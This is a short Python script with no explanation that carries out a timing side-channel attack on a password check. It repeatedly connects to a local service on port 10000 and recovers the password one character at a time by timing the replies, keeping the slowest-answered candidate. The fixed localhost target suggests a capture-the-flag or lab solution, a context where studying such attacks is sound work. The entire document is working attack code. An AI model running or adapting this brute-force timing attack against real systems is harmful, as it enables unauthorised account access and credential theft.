#!/usr/bin/python
import socket
import sys
import time


def run():
    port = 10000
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ "
    while True:
        password = ''
        while True:
            times = {}
            for _ in range(3):
                for c in charset:
                    client = socket.socket()
                    client.connect(('127.0.0.1', port))

                    client.send(password + c)
                    t1 = time.time()
                    response = client.recv(1024)
                    t2 = time.time()
                    t = t2 - t1
                    times[c] = times.get(c, 0) + t
                    #print c, t
                    response = response.strip()
                    if response != "denied":
                        print password + c
                        return response
                        sys.exit(0)

            chars = times.keys()
            chars.sort(key=lambda x: times[x])
            password += chars[-1]
            print password
            if len(password) > 20:
                # try again
                break

if __name__ == "__main__":
    run()
